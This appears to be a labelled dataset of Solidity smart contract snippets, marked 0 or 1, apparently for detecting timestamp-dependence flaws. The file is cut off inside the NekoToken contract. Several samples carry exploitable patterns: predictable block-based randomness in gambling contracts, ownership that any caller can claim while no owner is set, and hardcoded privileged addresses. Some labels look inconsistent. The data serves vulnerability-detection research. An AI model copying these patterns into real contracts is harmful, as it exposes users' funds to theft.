0<CODESPLIT>contract AllocatedCrowdsale is Crowdsale {     address public beneficiary;  function AllocatedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, address _beneficiary, uint baseEthCap, uint maxEthPerAddress)     Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, baseEthCap, maxEthPerAddress) {    beneficiary = _beneficiary;  }     function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {    if (tokenAmount > getTokensLeft()) {      return true;    } else {      return false;    }  }     function isCrowdsaleFull() public constant returns (bool) {    return getTokensLeft() == 0;  }     function getTokensLeft() public constant returns (uint) {    return token.allowance(owner, this);  }     function assignTokens(address receiver, uint256 tokenAmount) private {    if (!token.transferFrom(beneficiary, receiver, tokenAmount))       revert();  }}
1<CODESPLIT>contract Cryptoraces {    uint256 now;    function random() private view returns (uint) {        return uint(keccak256(block.difficulty, block.timestamp, now));    }}
1<CODESPLIT>contract FloraFicTokenCrowdsale {  uint256 public initialRate;  uint256 public rate;  uint256 public openingTime;  function getCurrentRate() public view returns (uint256) {    uint256 elapsedTime = block.timestamp - (openingTime);    uint num_day = uint(elapsedTime) / 86400;    rate = initialRate - (num_day * (initialRate) / (100));    return rate;  }}
1<CODESPLIT>contract EtherBet{	address gameOwner = address(0);	bool locked = false;	function bet() payable	{		if ((random()%2==1) && (msg.value == 1 ether) && (!locked))		{			if (!msg.sender.call.value(2 ether)())				throw;		}	}	function lock()	{		if (gameOwner==msg.sender)		{			locked = true;		}	}	function unlock()	{		if (gameOwner==msg.sender)		{			locked = false;		}	}	function own(address owner)	{		if ((gameOwner == address(0)) || (gameOwner == msg.sender))		{			gameOwner = owner;		}	}	function releaseFunds(uint amount)	{		if (gameOwner==msg.sender)		{			if (!msg.sender.call.value( amount * (1 ether))())				throw;		}	}	function random() view returns (uint8) {        	return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256);    	}	function () public  payable	{		bet();	}}
0<CODESPLIT>contract DepoToken is StandardToken, BurnableToken, Owned {    string public constant name = "Depository Network Token";    string public constant symbol = "DEPO";    uint8 public constant decimals = 18;         uint256 public constant HARD_CAP = 3000000000 * 10**uint256(decimals);         address public saleTokensAddress;         address public bountyTokensAddress;         address public reserveTokensAddress;         address public teamTokensAddress;         address public advisorsTokensAddress;         TokenTimelock public teamTokensLock;         bool public saleClosed = false;         mapping(address => bool) public whitelisted;         modifier beforeEnd {        require(!saleClosed);        _;    }    constructor(address _teamTokensAddress, address _advisorsTokensAddress, address _reserveTokensAddress,                address _saleTokensAddress, address _bountyTokensAddress) public {        require(_teamTokensAddress != address(0));        require(_advisorsTokensAddress != address(0));        require(_reserveTokensAddress != address(0));        require(_saleTokensAddress != address(0));        require(_bountyTokensAddress != address(0));        teamTokensAddress = _teamTokensAddress;        advisorsTokensAddress = _advisorsTokensAddress;        reserveTokensAddress = _reserveTokensAddress;        saleTokensAddress = _saleTokensAddress;        bountyTokensAddress = _bountyTokensAddress;        whitelisted[saleTokensAddress] = true;        whitelisted[bountyTokensAddress] = true;                          uint256 saleTokens = 1500000000 * 10**uint256(decimals);        totalSupply_ = saleTokens;        balances[saleTokensAddress] = saleTokens;        emit Transfer(address(0), saleTokensAddress, saleTokens);                 uint256 bountyTokens = 180000000 * 10**uint256(decimals);        totalSupply_ = totalSupply_.add(bountyTokens);        balances[bountyTokensAddress] = bountyTokens;        emit Transfer(address(0), bountyTokensAddress, bountyTokens);                 uint256 reserveTokens = 780000000 * 10**uint256(decimals);        totalSupply_ = totalSupply_.add(reserveTokens);        balances[reserveTokensAddress] = reserveTokens;        emit Transfer(address(0), reserveTokensAddress, reserveTokens);                 uint256 teamTokens = 360000000 * 10**uint256(decimals);        totalSupply_ = totalSupply_.add(teamTokens);        teamTokensLock = new TokenTimelock(this, teamTokensAddress, uint64(now + 2 * 365 days));        balances[address(teamTokensLock)] = teamTokens;        emit Transfer(address(0), address(teamTokensLock), teamTokens);                 uint256 advisorsTokens = 180000000 * 10**uint256(decimals);        totalSupply_ = totalSupply_.add(advisorsTokens);        balances[advisorsTokensAddress] = advisorsTokens;        emit Transfer(address(0), advisorsTokensAddress, advisorsTokens);        require(totalSupply_ <= HARD_CAP);    }         function close() public onlyOwner beforeEnd {        saleClosed = true;    }              function whitelist(address _address) external onlyOwner {        whitelisted[_address] = true;    }         function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {        if(!saleClosed) return false;        return super.transferFrom(_from, _to, _value);    }         function transfer(address _to, uint256 _value) public returns (bool) {        if(!saleClosed && !whitelisted[msg.sender]) return false;        return super.transfer(_to, _value);    }}
1<CODESPLIT>contract Tokenlock is Ownable {    using SafeERC20 for ERC20;    event LockStarted(uint256 now, uint256 interval);    event TokenLocked(address indexed buyer, uint256 amount);    event TokenReleased(address indexed buyer, uint256 amount);    mapping (address => uint256) public buyers;    address public locker;    address public distributor;    ERC20 public Token;    bool public started = false;    uint256 public interval;    uint256 public releaseTime;    constructor(address token, uint256 time) public {        require(token != address(0));        Token = ERC20(token);        interval = time;        locker = owner;        distributor = owner;    }    function setLocker(address addr)        external        onlyOwner    {        require(addr != address(0));        locker = addr;    }    function setDistributor(address addr)        external        onlyOwner    {        require(addr != address(0));        distributor = addr;    }         function lock(address beneficiary, uint256 amount)        external    {        require(msg.sender == locker);        require(beneficiary != address(0));        buyers[beneficiary] += amount;        emit TokenLocked(beneficiary, buyers[beneficiary]);    }         function start()        external        onlyOwner    {        require(!started);        started = true;        releaseTime = block.timestamp + interval;        emit LockStarted(block.timestamp, interval);    }         function release(address beneficiary)        external    {        require(msg.sender == distributor);        require(started);        require(block.timestamp >= releaseTime);                 uint256 amount = buyers[beneficiary];        buyers[beneficiary] = 0;        Token.safeTransfer(beneficiary, amount);        emit TokenReleased(beneficiary, amount);    }    function withdraw() public onlyOwner {        require(block.timestamp >= releaseTime);        Token.safeTransfer(owner, Token.balanceOf(address(this)));    }    function close() external onlyOwner {        withdraw();        selfdestruct(owner);    }}
1<CODESPLIT>contract LCBrixTokenCrowdsale {  uint256 public deadline = 1518652800;  bool public crowdsaleClosed = false;  function recalcFlags() public {    if (block.timestamp >= deadline)        crowdsaleClosed = true;    return;  }}
1<CODESPLIT>contract ParkadeCoinCrowdsale {  uint256 public firstBonusRate = 1838;  uint256 public normalRate = 1470;  uint256 public firstBonusEnds = 1535155200;  function currentRate() public view returns (uint256) {    if (block.timestamp < firstBonusEnds) {        return firstBonusRate;    }    else {         return normalRate;    }  }}
1<CODESPLIT>contract LimitCollectCoin is Coin, DSMath {         struct FreezingNode {        uint end_stamp;        uint num_lccs;        uint8 freezing_type;    }         mapping(address => FreezingNode[]) internal c_freezing_list;    constructor(uint256 token_supply, string token_name, string token_symbol) public {        init(token_supply, token_name, token_symbol);        setAuthority(new FreezerAuthority());    }    function addFreezer(address freezer) auth public {        FreezerAuthority(authority).addFreezer(freezer);    }    function removeFreezer(address freezer) auth public {        FreezerAuthority(authority).removeFreezer(freezer);    }    event ClearExpiredFreezingEvent(address indexed addr);    event SetFreezingEvent(address indexed addr, uint end_stamp, uint num_lccs, uint8 indexed freezing_type);    function clearExpiredFreezing(address addr) public {        FreezingNode[] storage nodes = c_freezing_list[addr];        uint length = nodes.length;                 uint left = 0;        while (left < length) {                         if (nodes[left].end_stamp <= block.timestamp) {                break;            }            left++;        }                 uint right = left + 1;        while (left < length && right < length) {                         if (nodes[right].end_stamp > block.timestamp) {                nodes[left] = nodes[right];                left++;            }            right++;        }        if (length != left) {            nodes.length = left;            emit ClearExpiredFreezingEvent(addr);        }    }    function validBalanceOf(address addr) constant public returns (uint) {        FreezingNode[] memory nodes = c_freezing_list[addr];        uint length = nodes.length;        uint total_lccs = balanceOf(addr);        for (uint i = 0; i < length; ++i) {            if (nodes[i].end_stamp > block.timestamp) {                total_lccs = sub(total_lccs, nodes[i].num_lccs);            }        }        return total_lccs;    }    function freezingBalanceNumberOf(address addr) constant public returns (uint) {        return c_freezing_list[addr].length;    }    function freezingBalanceInfoOf(address addr, uint index) constant public returns (uint, uint, uint8) {        return (c_freezing_list[addr][index].end_stamp, c_freezing_list[addr][index].num_lccs, uint8(c_freezing_list[addr][index].freezing_type));    }    function setFreezing(address addr, uint end_stamp, uint num_lccs, uint8 freezing_type) auth stoppable public {        require(block.timestamp < end_stamp);                 require(num_lccs < c_totalSupply);        clearExpiredFreezing(addr);        uint valid_balance = validBalanceOf(addr);        require(valid_balance >= num_lccs);        FreezingNode memory node = FreezingNode(end_stamp, num_lccs, freezing_type);        c_freezing_list[addr].push(node);        emit SetFreezingEvent(addr, end_stamp, num_lccs, freezing_type);    }    function transferAndFreezing(address _to, uint256 _value, uint256 freeze_amount, uint end_stamp, uint8 freezing_type) auth stoppable public returns (bool) {                 require(_value < c_totalSupply);        require(freeze_amount <= _value);        transfer(_to, _value);        setFreezing(_to, end_stamp, freeze_amount, freezing_type);        return true;    }    function transfer(address _to, uint256 _value) stoppable public returns (bool) {        require(msg.data.length >= (2 * 32) + 4);                 require(_value < c_totalSupply);        clearExpiredFreezing(msg.sender);        uint from_lccs = validBalanceOf(msg.sender);        require(from_lccs >= _value);        c_balances[msg.sender] = sub(c_balances[msg.sender], _value);        c_balances[_to] = add(c_balances[_to], _value);        emit Transfer(msg.sender, _to, _value);        return true;    }    function transferFrom(address _from, address _to, uint256 _value) stoppable public returns (bool) {                 require(_value < c_totalSupply);        require(c_approvals[_from][msg.sender] >= _value);        clearExpiredFreezing(_from);        uint from_lccs = validBalanceOf(_from);        require(from_lccs >= _value);        c_approvals[_from][msg.sender] = sub(c_approvals[_from][msg.sender], _value);        c_balances[_from] = sub(c_balances[_from], _value);        c_balances[_to] = add(c_balances[_to], _value);        emit Transfer(_from, _to, _value);        return true;    }}
1<CODESPLIT>contract EscapeMmmEvents {    uint256 public airDropTracker_ = 0;    function airdrop() private view returns (bool) {        uint256 seed = uint256(keccak256(abi.encodePacked(block.timestamp)));        if(seed - (seed / 10000) * (10000) < airDropTracker_) {            return true;        }        return false;    }}
1<CODESPLIT>contract ETRToken {    function getBounusPercent(uint startDate) private view returns (uint256) {        uint8[5] memory bonusPercents = [200, 100, 50, 25, 0];        uint256 currentDay = block.timestamp;        uint256 delta = currentDay - startDate;        uint8 bonus = bonusPercents[delta];        return bonus;    }}
0<CODESPLIT>contract OSM is DSAuth, DSStop {    DSValue public src;        uint16 constant ONE_HOUR = uint16(3600);    uint16 public hop = ONE_HOUR;    uint64 public zzz;    struct Feed {        uint128 val;        bool    has;    }    Feed cur;    Feed nxt;    event LogValue(bytes32 val);        constructor (DSValue src_) public {        src = src_;        (bytes32 wut, bool ok) = src_.peek();        if (ok) {            cur = nxt = Feed(uint128(wut), ok);            zzz = prev(era());        }    }    function era() internal view returns (uint) {        return block.timestamp;    }    function prev(uint ts) internal view returns (uint64) {        return uint64(ts - (ts % hop));    }    function step(uint16 ts) external auth {        require(ts > 0);        hop = ts;    }    function void() external auth {        cur = nxt = Feed(0, false);        stopped = true;    }    function pass() public view returns (bool ok) {        return era() >= zzz + hop;    }    function poke() external stoppable {        require(pass());        (bytes32 wut, bool ok) = src.peek();        cur = nxt;        nxt = Feed(uint128(wut), ok);        zzz = prev(era());        emit LogValue(bytes32(cur.val));    }    function peek() external view returns (bytes32,bool) {        return (bytes32(cur.val), cur.has);    }    function peep() external view returns (bytes32,bool) {        return (bytes32(nxt.val), nxt.has);    }    function read() external view returns (bytes32) {        require(cur.has);        return (bytes32(cur.val));    }}
1<CODESPLIT>contract TokenMintPoD {  uint256 public lockTime;  function getBalanceOfToken() public constant returns (uint256) {    if (block.timestamp <= lockTime)        return lockTime;  }}
1<CODESPLIT>contract ERC200 {    struct InvestorLock {        uint amount;    }    uint startsAt;    mapping(address => InvestorLock) private _investorLocks;    uint investorLockedAmount = 0;    function getInvestorLockedAmount(address account) public view returns (uint) {        uint amount = _investorLocks[account].amount;        if (amount > 0) {          uint timestamp = block.timestamp;          if (timestamp <= startsAt) {            return investorLockedAmount;          }        }    }}
1<CODESPLIT>contract UniswapV2OracleLibrary {    function currentBlockTimestamp() internal view returns (uint32) {        return uint32(block.timestamp % 2 ** 32);    }}
1<CODESPLIT>contract DutchSwapAuction  {    uint256 public startDate;    uint256 public priceDrop;    function _currentPrice() private view returns (uint256) {        uint256 elapsed = block.timestamp - startDate;        uint256 priceDiff = elapsed * priceDrop;        return priceDiff;    }}
1<CODESPLIT>contract Lock {    mapping(address => uint256) public teamLockTime;    function teamAvailable(address _to) internal constant returns (uint256) {        uint256 now1 = block.timestamp;        uint256 lockTime = teamLockTime[_to];        uint256 time = now1 - (lockTime);        uint256 percent = 0;        if(time >= 365 days) {           percent = (time / (30 days)) + (1);        }        uint256 avail = avail * (percent) / (12) ;        return avail;    }}
1<CODESPLIT>contract CryptoRoulette {    function shuffle() internal returns (uint){        uint8 secretNumber = uint8(sha3(now, block.blockhash(block.timestamp-1))) % 20 + 1;        return secretNumber;    }}
0<CODESPLIT>contract WETH9_ {    string public name     = "Wrapped Ether";    string public symbol   = "WETH";    uint8  public decimals = 18;    event  Approval(address indexed src, address indexed guy, uint wad);    event  Transfer(address indexed src, address indexed dst, uint wad);    event  Deposit(address indexed dst, uint wad);    event  Withdrawal(address indexed src, uint wad);    mapping (address => uint)                       public  balanceOf;    mapping (address => mapping (address => uint))  public  allowance;    function() public payable {        deposit();    }    function deposit() public payable {        balanceOf[msg.sender] += msg.value;        Deposit(msg.sender, msg.value);    }    function withdraw(uint wad) public {        require(balanceOf[msg.sender] >= wad);        balanceOf[msg.sender] -= wad;        msg.sender.transfer(wad);        Withdrawal(msg.sender, wad);    }    function totalSupply() public view returns (uint) {        return this.balance;    }    function approve(address guy, uint wad) public returns (bool) {        allowance[msg.sender][guy] = wad;        Approval(msg.sender, guy, wad);        return true;    }    function transfer(address dst, uint wad) public returns (bool) {        return transferFrom(msg.sender, dst, wad);    }    function transferFrom(address src, address dst, uint wad)        public        returns (bool)    {        require(balanceOf[src] >= wad);        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {            require(allowance[src][msg.sender] >= wad);            allowance[src][msg.sender] -= wad;        }        balanceOf[src] -= wad;        balanceOf[dst] += wad;        Transfer(src, dst, wad);        return true;    }}interface FundInterface {         event PortfolioContent(address[] assets, uint[] holdings, uint[] prices);    event RequestUpdated(uint id);    event Redeemed(address indexed ofParticipant, uint atTimestamp, uint shareQuantity);    event FeesConverted(uint atTimestamp, uint shareQuantityConverted, uint unclaimed);    event CalculationUpdate(uint atTimestamp, uint managementFee, uint performanceFee, uint nav, uint sharePrice, uint totalSupply);    event ErrorMessage(string errorMessage);              function requestInvestment(uint giveQuantity, uint shareQuantity, address investmentAsset) external;    function executeRequest(uint requestId) external;    function cancelRequest(uint requestId) external;    function redeemAllOwnedAssets(uint shareQuantity) external returns (bool);         function enableInvestment(address[] ofAssets) external;    function disableInvestment(address[] ofAssets) external;    function shutDown() external;         function emergencyRedeem(uint shareQuantity, address[] requestedAssets) public returns (bool success);    function calcSharePriceAndAllocateFees() public returns (uint);              function getModules() view returns (address, address, address);    function getLastRequestId() view returns (uint);    function getManager() view returns (address);         function performCalculations() view returns (uint, uint, uint, uint, uint, uint, uint);    function calcSharePrice() view returns (uint);}interface AssetInterface {              event Approval(address indexed _owner, address indexed _spender, uint _value);                   function transfer(address _to, uint _value, bytes _data) public returns (bool success);              function transfer(address _to, uint _value) public returns (bool success);    function transferFrom(address _from, address _to, uint _value) public returns (bool success);    function approve(address _spender, uint _value) public returns (bool success);         function balanceOf(address _owner) view public returns (uint balance);    function allowance(address _owner, address _spender) public view returns (uint remaining);}
1<CODESPLIT>contract OperatorStaking is DBC {         event Staked(address indexed user, uint256 amount, uint256 total, bytes data);    event Unstaked(address indexed user, uint256 amount, uint256 total, bytes data);    event StakeBurned(address indexed user, uint256 amount, bytes data);         struct StakeData {        uint amount;        address staker;    }         struct Node {        StakeData data;        uint prev;        uint next;    }              Node[] internal stakeNodes;           uint public minimumStake;    uint public numOperators;    uint public withdrawalDelay;    mapping (address => bool) public isRanked;    mapping (address => uint) public latestUnstakeTime;    mapping (address => uint) public stakeToWithdraw;    mapping (address => uint) public stakedAmounts;    uint public numStakers;      AssetInterface public stakingToken;              function OperatorStaking(        AssetInterface _stakingToken,        uint _minimumStake,        uint _numOperators,        uint _withdrawalDelay    )        public    {        require(address(_stakingToken) != address(0));        stakingToken = _stakingToken;        minimumStake = _minimumStake;        numOperators = _numOperators;        withdrawalDelay = _withdrawalDelay;        StakeData memory temp = StakeData({ amount: 0, staker: address(0) });        stakeNodes.push(Node(temp, 0, 0));    }         function stake(        uint amount,        bytes data    )        public        pre_cond(amount >= minimumStake)    {        uint tailNodeId = stakeNodes[0].prev;        stakedAmounts[msg.sender] += amount;        updateStakerRanking(msg.sender);        require(stakingToken.transferFrom(msg.sender, address(this), amount));    }    function unstake(        uint amount,        bytes data    )        public    {        uint preStake = stakedAmounts[msg.sender];        uint postStake = preStake - amount;        require(postStake >= minimumStake || postStake == 0);        require(stakedAmounts[msg.sender] >= amount);        latestUnstakeTime[msg.sender] = block.timestamp;        stakedAmounts[msg.sender] -= amount;        stakeToWithdraw[msg.sender] += amount;        updateStakerRanking(msg.sender);        emit Unstaked(msg.sender, amount, stakedAmounts[msg.sender], data);    }    function withdrawStake()        public        pre_cond(stakeToWithdraw[msg.sender] > 0)        pre_cond(block.timestamp >= latestUnstakeTime[msg.sender] + withdrawalDelay)    {        uint amount = stakeToWithdraw[msg.sender];        stakeToWithdraw[msg.sender] = 0;        require(stakingToken.transfer(msg.sender, amount));    }         function isValidNode(uint id) view returns (bool) {                          return id != 0 && (id == stakeNodes[0].next || stakeNodes[id].prev != 0);    }    function searchNode(address staker) view returns (uint) {        uint current = stakeNodes[0].next;        while (isValidNode(current)) {            if (staker == stakeNodes[current].data.staker) {                return current;            }            current = stakeNodes[current].next;        }        return 0;    }    function isOperator(address user) view returns (bool) {        address[] memory operators = getOperators();        for (uint i; i < operators.length; i++) {            if (operators[i] == user) {                return true;            }        }        return false;    }    function getOperators()        view        returns (address[])    {        uint arrLength = (numOperators > numStakers) ?            numStakers :            numOperators;        address[] memory operators = new address[](arrLength);        uint current = stakeNodes[0].next;        for (uint i; i < arrLength; i++) {            operators[i] = stakeNodes[current].data.staker;            current = stakeNodes[current].next;        }        return operators;    }    function getStakersAndAmounts()        view        returns (address[], uint[])    {        address[] memory stakers = new address[](numStakers);        uint[] memory amounts = new uint[](numStakers);        uint current = stakeNodes[0].next;        for (uint i; i < numStakers; i++) {            stakers[i] = stakeNodes[current].data.staker;            amounts[i] = stakeNodes[current].data.amount;            current = stakeNodes[current].next;        }        return (stakers, amounts);    }    function totalStakedFor(address user)        view        returns (uint)    {        return stakedAmounts[user];    }              function insertNodeSorted(uint amount, address staker) internal returns (uint) {        uint current = stakeNodes[0].next;        if (current == 0) return insertNodeAfter(0, amount, staker);        while (isValidNode(current)) {            if (amount > stakeNodes[current].data.amount) {                break;            }            current = stakeNodes[current].next;        }        return insertNodeBefore(current, amount, staker);    }    function insertNodeAfter(uint id, uint amount, address staker) internal returns (uint newID) {                 require(id == 0 || isValidNode(id));        Node storage node = stakeNodes[id];        stakeNodes.push(Node({            data: StakeData(amount, staker),            prev: id,            next: node.next        }));        newID = stakeNodes.length - 1;        stakeNodes[node.next].prev = newID;        node.next = newID;        numStakers++;    }    function insertNodeBefore(uint id, uint amount, address staker) internal returns (uint) {        return insertNodeAfter(stakeNodes[id].prev, amount, staker);    }    function removeNode(uint id) internal {        require(isValidNode(id));        Node storage node = stakeNodes[id];        stakeNodes[node.next].prev = node.prev;        stakeNodes[node.prev].next = node.next;        delete stakeNodes[id];        numStakers--;    }         function updateStakerRanking(address _staker) internal {        uint newStakedAmount = stakedAmounts[_staker];        if (newStakedAmount == 0) {            isRanked[_staker] = false;            removeStakerFromArray(_staker);        } else if (isRanked[_staker]) {            removeStakerFromArray(_staker);            insertNodeSorted(newStakedAmount, _staker);        } else {            isRanked[_staker] = true;            insertNodeSorted(newStakedAmount, _staker);        }    }    function removeStakerFromArray(address _staker) internal {        uint id = searchNode(_staker);        require(id > 0);        removeNode(id);    }}
1<CODESPLIT>contract ShortingRewards{    uint256 public rewardRate = 2;    uint256 public periodFinish = 0;    uint256 rewardsDuration = 2;    function notifyRewardAmount(uint256 reward) public {        if (block.timestamp >= periodFinish) {            rewardRate = reward / rewardsDuration;        } else {            rewardRate = (reward + rewardRate) / (rewardsDuration);        }    }}
1<CODESPLIT>contract EtherFarm {    struct User {        uint256 payouts;        uint256 deposit_amount;        uint256 deposit_payouts;    }    mapping(address => User) public users;    uint256 public divisor = 60;    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {        max_payout = 100;        if(users[_addr].deposit_payouts < max_payout) {            payout = (users[_addr].deposit_amount * block.timestamp / 1 days) ;            if(users[_addr].deposit_payouts + payout > max_payout) {                payout = max_payout - users[_addr].deposit_payouts;            }        }    }}
0<CODESPLIT>contract Bigba{    uint public players = 0;       uint amount;    uint time;    uint payment;    address winner;        address public owner;        address public meg = address(this);    modifier _onlyowner {        if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)             _     }        function Bigba() {         owner = msg.sender;      }    function() {        Start();    }    function Start(){        address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;        if (msg.sender == owner) {               UpdatePay();             }else {            if (msg.value == (1 ether)/10)              {                uint fee;                    fee=msg.value/10;                                        developer.send(fee/2);                   owner.send(fee/2);                   fee=0;                                   amount++;                                                                    if (amount>10) {                        uint deltatime = block.timestamp;                            if (deltatime >= time + 1 hours)                        {                        payment=meg.balance/100*90;                          amount=0;                            winner.send(payment);                            payment=0;                       }                }                time=block.timestamp;                    winner = msg.sender;               } else {                uint _fee;                    _fee=msg.value/10;                    developer.send(_fee/2);                   owner.send(_fee/2);                   fee=0;                   msg.sender.send(msg.value - msg.value/10);              }                    }            }        function UpdatePay() _onlyowner {            if (meg.balance>((1 ether)/10)) {               msg.sender.send(((1 ether)/10));        } else {            msg.sender.send(meg.balance);        }    }}
1<CODESPLIT>contract NekoToken {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }             modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                     modifier onlyAdministrator(){        address _customerAddress = msg.sender;        require(administrators[_customerAddress]);        _;    }                           modifier antiEarlyWhale(uint256 _amountOfEthereum){        address _customerAddress = msg.sender;                                  if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){            require(                                 ambassadors_[_customerAddress] == true &&                                                 (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_                            );                                     ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);                                 _;        } else {                         onlyAmbassadors = false;            _;            }            }                 event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );        event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );        event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );        event onWithdraw(                                        address indexed customerAddress,        uint256 ethereumWithdrawn    );     event onWin(        address indexed customerAddress,        uint256 ethereumWon    );             event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );                 string public name = "NEKO TOKEN";    string public symbol = "NEKO";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 4;                   uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;             uint256 public stakingRequirement = 100e18;             mapping(address => bool) internal ambassadors_;    uint256 constant internal ambassadorMaxPurchase_ = 5 ether;    uint256 constant internal ambassadorQuota_ = 10 ether;                         mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => uint256) internal ambassadorAccumulatedQuota_;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    uint256 internal jackpot_ = 0;             mapping(address => bool) public administrators;             bool public onlyAmbassadors = true;        address Master;    uint256 jackpotThreshold;    uint jackpotFactor = 250;    uint256 jackpotCounter = 0;    address lastWinner = 0x0000000000000000000000000000000000000000;              function NekoToken()        public    {                 administrators[msg.sender] = true;                ambassadors_[0xa9eB31931417d89b233681dfb319783b1703C998] = true;        ambassadors_[0x3662496Bd906054f535D534c46d130A4ee36624C] = true;        ambassadors_[0x83c0Efc6d8B16D87BFe1335AB6BcAb3Ed3960285] = true;        ambassadors_[0xAD6D6c25FCDAb2e737e8de31795df4c6bB6D9Bae] = true;                 ambassadors_[0x4F4eBF556CFDc21c3424F85ff6572C77c514Fcae] = true;        Master = msg.sender;        onlyAmbassadors = true;           jackpotThreshold = random() * 1e15 * jackpotFactor;                   }                  function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);            }             function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }             function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                           address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         uint256 _tokens = purchaseTokens(_dividends, 0x0);                         onReinvestment(_customerAddress, _dividends, _tokens);    }             function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                         withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                           payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         _customerAddress.transfer(_dividends);                         onWithdraw(_customerAddress, _dividends);    }             function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);                         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                                if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                         onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }                 function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                                           require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                         if(myDividends(true) > 0) withdraw();                                  uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);        uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);        uint256 _dividends = tokensToEthereum_(_tokenFee);                   tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);                         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);                         Transfer(_customerAddress, _toAddress, _taxedTokens);                         return true;           }                    function disableInitialStage()        onlyAdministrator        public    {        onlyAmbassadors = true;    }             function setAdministrator(address _identifier, bool _status)        onlyAdministrator()        public    {        administrators[_identifier] = _status;    }             function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }             function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }         function setJackpotFactor(uint _factor)        onlyAdministrator()        public    {        jackpotFactor = _factor;    }             function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }                    function totalEthereumBalance()        public        view        returns(uint)    {        return this.balance;    }             function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }             function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }              function myDividends(bool _includeReferralBonus)         public         view         returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }             function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }        function jackpot()        public        view        returns(uint256)    {        return jackpot_;    }          function getLastWinner()        public        view        returns(address)    {        return lastWinner;    }             function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }             function sellPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );    